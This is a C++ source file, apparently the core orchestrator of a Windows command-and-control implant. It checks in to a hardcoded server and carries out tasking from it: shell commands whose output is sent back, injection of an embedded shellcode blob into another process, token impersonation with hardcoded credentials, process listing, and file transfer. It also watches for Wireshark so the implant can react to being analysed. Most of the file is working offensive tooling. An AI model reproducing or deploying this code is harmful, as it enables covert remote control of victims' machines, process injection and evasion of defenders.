#include "stdafx.h"
#include "windows.h"
#include "AgentOrchestrator.h"
#include <Winhttp.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <queue>

#include "EventSink.h"
#include "AgentSleep.h"
#include "AgentFileFinder.h"
#include "AgentAvDetect.h"
#include "AgentVmDetect.h"
#include "AgentPS.h"
#include "AgentSend.h"
#include "AgentLog.h"
#include "AgentGlobals.h"
#include "AgentShellExec.h"
#include "AgentShellCmd.h"
#include "AgentToken.h"
#include "AgentEncyption.h"
#include "AgentWMI.h"
#include "AgentWMIMonitor.h"
#include "AgentWMILogEventSink.h"


#pragma comment(lib, "winhttp.lib")
#define _WIN32_DCOM
#include <iostream>
#include <comdef.h>
#include "json.hpp"
#include <Wbemidl.h>

char shellcode[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x6d\x64\x20\x2f\x6b\x20\x63\x61\x6c\x63"
"\x00";

bool AgentOrchestrator::coreOrchestrator()
{
	/*
	Main entry point for application 
	allowing for class inher. 
	*/

	AgentSend se;
	// First thing we do is set up enviroment 
	initzializeEnviroment();
	if (!enageWMIMonitoring()) // setup wmi monitors and ensure they start 
	{
		memoryLog(3, "coreOrchestrator() failed to start WMI monitors");
	}
	AgentSleep s;
	memoryLog(1, "coreOrchestrator() in main loop");
	int lostLimitCounter = 0;
	bool alive = true;
	while (alive != false) {
		int lostLimit = agentJson["agentSleep"]["agentLostLimit"];
		if (lostLimitCounter >= lostLimit)
		{
			// TODO: cleanup jobs left running
			memoryLog(2, "coreOrchestrator() lost limit reached");
			break;
		}
		// checkin seq
		if (!se.sendCheckinMessage())
			{
				// failed to checkin
				memoryLog(2, "coreOrchestrator() failed to checkin");
			}

		// check the return data
		requestCodeHandler();
		memoryLog(0, "coreOrchestrator() is in sleep cycle");
		s.sleepAgent(
			agentJson["agentSleep"]["agentDelay"], // sleep time
			agentJson["agentSleep"]["agentJitter"] // sleep jitter
			);

	}
	memoryLog(1, "coreOrchestrator() Agent is exiting");
	return false;
}

bool AgentOrchestrator::initzializeEnviroment()
{
	// Set up the required vars
	int sleepTime = 1000;
	std::wstring stageKey = L"?token=123456789";
	std::wstring stageServer = L"192.168.2.238";
	std::wstring stageGetUri = L"/api/version";
	std::wstring stagePostUri = L"/api/search";
	int agentId = 123;
	AgentPS PS;
	int agentPid = PS.agentPid();
	std::wstring agentUser;
	std::wstring agentDisplayName;
	int agentDelay = 5;
	int agentJitter = 1;
	int agentLostLimit = 60;

	// Build agent JSON code object
	AgentSend s;
	s.setAgentCodes();

	AgentHelpers help;
	agentDisplayName = help.GetDisplayName();
	agentUser = help.GetSamName();

	// Build JSON object for agent settings and ability to pass
	agentSettings(
		agentId,
		agentPid,
		agentUser,
		agentDisplayName,
		agentDelay,
		agentJitter,
		agentLostLimit,
		stageServer,
		stageGetUri,
		stagePostUri,
		stageKey
		);
	//auto j = json::parse(agentJson);
	//std::cout << agentJson.dump(4) << std::endl;

	// Test request to stage uri
	//requestHandler(stageServer, stageGetUri);
	memoryLog(0, "Setup initzializeEnviroment()");
	memoryLog(0, "initzializeEnviroment() starting up WMI monitors");
	//register the agent via the api call
	std::string agent_settings = agentJson.dump();
	s.sendMessage(60, agent_settings, "json");
	return true;
}

bool AgentOrchestrator::agentSettings(
	int agentId,
	int agentPid,
	std::wstring agentUser,
	std::wstring agentDisplayName,
	int agentDelay,
	int agentJitter,
	int agentLostLimit,
	std::wstring stageServer,
	std::wstring stageGetUri,
	std::wstring stagePostUri,
	std::wstring stageKey
	)
{
	/*
	A JSON object that will be passed through out the agent
	to build the setting's required to op.

	The structure will look like:
	{
	"agentId" : 23122342323
	"agentPid" : 9182
	"agentUser" : "ARD/james"
	"agentSleep" : {
	"agentDelay" : 60     //secs
	"agentJitter" : 10    //secs
	"agentLostLimit" : 60 //itt's
	}
	"agentStage" : {
	"stageServer" : "www.httpbin.org"
	"stageKey" : "herewecometoown"
	"stageGetUri" : "/get"
	"stagePostUri" : "/post"
	}
	}
	*/
	// Set agent id
	agentJson["agentId"] = agentId;
	// set agent ver
	agentJson["agentId"] = 1;
	// Set agent Pid
	agentJson["agentPid"] = agentPid;
	// Set agent user
	agentJson["agentUser"] = agentUser;
	agentJson["agentDisplayName"] = agentDisplayName;
	// set agent os
	AgentHelpers help;
	std::cout << help.timeDateLocal() << std::endl;
	agentJson["agentOs"] = help.CheckOSVersion();
	// Set agent Arch
	agentJson["agentArch64"] = help.is64bit();
	// Set agent log level
	agentJson["agentLogLevel"] = 0;
	// Set agent start date / time
	std::string time = help.timeDateLocal();
	agentJson["agentStartTime"] = time;
	//set agentSleep array
	agentJson["agentSleep"]["agentDelay"] = agentDelay;
	agentJson["agentSleep"]["agentJitter"] = agentJitter;
	agentJson["agentSleep"]["agentLostLimit"] = agentLostLimit;
	agentJson["agentSleep"]["agentKillDate"] = 0;
	// set agent server shit
	agentJson["agentServer"]["stageServer"] = stageServer;
	agentJson["agentServer"]["stageKey"] = stageKey;
	agentJson["agentServer"]["stageGetUri"] = stageGetUri;
	agentJson["agentServer"]["stagePostUri"] = stagePostUri;
	// return json object as string 
	std::wstring s = agentJson["agentDisplayName"];
	std::wcout << s << std::endl;
	if (!agentJson.is_null())
		memoryLog(1, "agentSettings() JSON object built");
	return true;
}

//int AgentOrchestrator::requestHandler(LPCWSTR stageServer, LPCWSTR stageUri)
//{
//	/*
//	This function will handle the request to the staging uri and
//	get the stage command or sleep command to set up the global
//	vars. This will allow some C&C type of comms!
//	*/
//	std::string data;
//	AgentHTTP http;
//	data = http.HttpRequest(stageServer, stageUri);
//	auto j3 = json::parse(data);
//	//j3["foo"] = 23;
//	//std::cout << j3.dump(4) << std::endl;
//	//std::cout << j3["foo"] << std::endl;
//
//	// Now parse the request into a json dump
//	return 0;
//}

int AgentOrchestrator::requestCodeHandler()
{
	/*
	Take in a string value
	and convert it to the proper
	request code agent tasking.
	00 = exit agent
	01 = set sleep/jitter time
	03 = set killdate
	04 = set lost limit
	05 = agent checkin
	06 = set agent log level (defualt 3)
	07 = get agent log 
	08 = error data to send

	10 = set stage server
	11 = set stage key
	12 = set stageGetUri
	13 = set stagePostUri

	20 = run shell command
	21 = run av detect
	22 = run vmware detect 
	23 = run ps list
	24 = run shell code exec
	25 = run file find
	26 = run WmiProcQuery
	27 = run WmiProcMon
	28 = run RevToSelf Token Manipulation
	29 = run MakeToken Token Manipulation

	30 = download file
	31 = upload file

	40 = get WMI Process Monitoring Logs
	41 = get WMI Serivce Monitoring Logs
	42 = get WMI Driver Monitoring Logs

	45 = push WMI Process Monitoring 
	45 = push WMI Service Monitoring



	50 = return agent JSON settings
	51 = set agent panic level
	52 = DeepFreeze agent event trigger 
	53 = DeepFreeze agent event alert

	60 = Register inital agent

	70 = Start WMI event log monitor

	100 = do nothing and rest json object 
	*/
	std::string agentJsonDump;
	/*std::string t = "requestCodeHandler() command recv: ";
	std::string t2 = agentReturnJson["command"];
	t = t + t2;
	memoryLog(1, t);*/
	int requestJson = agentReturnJson["command"];
	DWORD procID = 4476;
	switch (requestJson)
	{
	case 00:
	{
		memoryLog(1, "requestCodeHandler() exit signal set");
		exitAgentClean();
		break;
	}
	case 01:
		memoryLog(1, "requestCodeHandler() sleep value set");
		memoryLog(1, "requestCodeHandler() sleep jitter value set");
		agentJson["agentSleep"]["agentDelay"] = agentReturnJson["delay"];
		agentJson["agentSleep"]["agentJitter"] = agentReturnJson["jitter"];
		break;
	case 03:
		memoryLog(1, "requestCodeHandler() kill date set");
		agentJson["agentSleep"]["agentKillDate"] = 0;
		break;
	case 04:
		memoryLog(1, "requestCodeHandler() lost limit set");
		agentJson["agentSleep"]["agentLostLimit"] = 0;
		break;
	case 05:
		break;
	case 07:
	{
		memoryLog(1, "requestCodeHandler() get log data and send to server");
		std::string temp = agentLogJson.dump();
		AgentSend se;
		se.sendMessage(07, temp, "string");
		break;
	}
	case 10:
		memoryLog(1, "requestCodeHandler() stage server chnages set");
		agentJson["agentServer"]["stageServer"] = "";
		break;
	case 20:
	{
		memoryLog(1, "requestCodeHandler() run shell command");
		std::string temp = agentReturnJson["shellcommand"];
		AgentShellCmd shell;
		AgentSend se;
		auto s = shell.runShellCmd(temp);
		se.sendMessage(20, s, "string");
		break;
	}
	case 21:
	{
		memoryLog(1, "requestCodeHandler() run av detect");
		break;
	}
	case 22:
		memoryLog(1, "requestCodeHandler() run vmware checks");
		AgentSend s;
		s.sendMessage(
			agentCodes["runVmwareDet"],
			"[*] Now Checking for VMmare localy\n"
			);
		break;
	case 23:
	{
		memoryLog(1, "requestCodeHandler() get process list in JSON and send to server");
		json processObjects;
		AgentPS PS;
		AgentSend se;
		json po = PS.AgentPSEnumID();
		if (!po.empty()) {
			auto temp = po.dump();
			se.sendMessage(23, temp, "string");
			break;
		}
		// TODO: handle error messages controller side moving forward
		se.sendMessage(8, "[*] Failed to get process list, no data returned! (check agent logs)", "string");
		break;
	}
	case 24:
	{
		memoryLog(1, "requestCodeHandler() run shellcode injection");
		int size = 197;
		new unsigned char[size];
		AgentShellExec se;
		se.injectShellCode(5, procID, shellcode);
		break;
	}
	case 26:
	{
		memoryLog(1, "requestCodeHandler() run WmiProcQuery");
		std::string temp = WmiProcQuey().dump();
		AgentSend se;
		if (!temp.empty()) {
			se.sendMessage(agentCodes["runWmiProcQuery"], temp);
			break;
		}
		else {
			// TODO: handle error messages controller side moving forward
			se.sendMessage(8, "[*] Failed to get WMI process list, no data returned! (check agent logs)", "string");
		}
		
	}
	case 28:
	{
		// revert token back to original context
		memoryLog(1, "requestCodeHandler() run RevToSelf()");
		AgentToken token;
		AgentSend s;
		if (!token.revertToSelf())
		{
			s.sendMessage(
				int(28),
				"[*] Failed to RevertToSelf!\n",
				"string"
				);
			pillProcessContainer.push("exit");
			break;
		}
		else
		{
			s.sendMessage(
				int(28),
				"[*] Token RevertToSelf succeed!\n",
				"string"
				);
			break;
		}
	}
	case 29:
	{
		memoryLog(1, "requestCodeHandler() run MakeToken()");
		AgentToken token;
		AgentSend s;
		std::wstring username = L"jay";
		std::wstring password = L"83128312_AA_aa";
		std::wstring domain = L"Workgroup";
		if (!token.makeToken(username.c_str(), password.c_str(), domain.c_str()))
		{
			s.sendMessage(
				int(29),
				"[*] Failed to MakeToken!",
				"string"
				);
			break;
		}
		else
		{
			s.sendMessage(
				int(29),
				"[*] MakeToken ImpersonateLoggedOnUser successed, primary token inherited",
				"string"
				);
			break;
		}

	}
	case 40:
	{
		memoryLog(1, "requestCodeHandler() get WMI process monitoring JSON and send to server");
		auto temp = agentProcessMonitorLog.dump();
		AgentSend se;
		se.sendMessage(40, temp, "string");
		break;
	}
	case 41:
	{
		memoryLog(1, "requestCodeHandler() get WMI service monitoring JSON and send to server");
		auto temp = agentServiceMonitorLog.dump();
		AgentSend se;
		se.sendMessage(41, temp, "string");
		break;
	}
	case 52:
		memoryLog(1, "requestCodeHandler() DeepFreeze");
		agentJsonDump = agentJson.dump();
		std::cout << agentJson.dump(4) << std::endl;
		break;
	case 70:
		break;
	case 100:
		memoryLog(1, "requestCodeHandler() checkin returned no tasking, reseting json object");
		agentReturnJson.empty();
		break;
	default:
		break;
	}
	return 0;
}

bool AgentOrchestrator::enageWMIMonitoring()
{
	// TODO: add in thread array to hold the threads for later join / kill
	// note pills are in scope for this class
	std::thread t1(&AgentWMIMonitor::monitorWMIData, AgentWMIMonitor(), wmiProcessTestRules());
	t1.detach();
	Sleep(1000);
	std::thread t2(&AgentWMIMonitor::monitorProcessCreation, AgentWMIMonitor(), pillProcessContainer);
	Sleep(2000); // sleep for init of namespace
	t2.detach();
	std::thread t3(&AgentWMIMonitor::monitorServiceCreation, AgentWMIMonitor(), pillEventLogContainer);
	// detach since we can cont via q
	Sleep(2000);
	t3.detach();
	// start wmi monitoring
	return true;
}
void AgentOrchestrator::exitAgentClean()
{
	/*
	Exit agent clean with proper 
	aray clean up and zero.
	*/
	memoryLog(0, "exitAgentClean() starting cleanup");
	while (!hostEventContainer.empty())
	{
		hostEventContainer.pop();
	}
	memoryLog(0, "exitAgentClean() hostEventContainer2 container deleted!");
	// TODO: Make sure we clear all the JSON objects in memory 
	//agentJson.clear();
	//agentSendJson.clear();
	//agentCodes.clear();
	//agentLogArray.clear();
	//agentLogArray.shrink_to_fit();
	// Kill all threads for process monitoring
	pillProcessContainer.push("exit");
	memoryLog(0, "exitAgentClean() pillProcessContainer pill set to exit!");
	pillEventLogContainer.push("exit");
	memoryLog(0, "exitAgentClean() pillEventLogContainer pill set to exit!");
	memoryLog(0, "exitAgentClean() sleeping for 10 seconds for WMI event collectors to exit!");
	// TODO: do we need to sleep?
	// Exit agent and call destructors
	AgentSend s;
	s.sendMessage(
		int(00),
		"[*] Agent completed exit routine\n",
		"string"
		);
	std::terminate();
}

std::vector<json> AgentOrchestrator::wmiProcessTestRules()
/*
test function for JSON rule population
*/
{
	std::vector<json> rules;
	json rule = {
		// TODO: Check if wireshark has cmd line flags we need to catch
		{ "MonitorType", "ProcessEvent" },
		{ "EventType", "InstanceCreationEvent"}, // creation (start)
		{ "Name", "Wireshark.exe" }, // chekc the name of the binary 
		{ "ExecutablePath", "Wireshark" }, // check if the name is in the path for rename cases
		{ "CommandLine", "Wireshark" }, // if cmd line contains this panic
		{ "PanicSettings",{
			{ "SleepAgent", 120 }, // Sleep agent
			{ "SleepJitter", 10 }, // Jitter for sleep
			{ "ExitAgent", false }, // exit the agent?
			{ "ZeroAgent", false },
			{ "ReportTrigger", true }, // Report the a event trigger 
			{ "ReportAlert", true } // Report the JSON event trigger 
		} }
	};
	rules.push_back(rule);
	return rules;
}

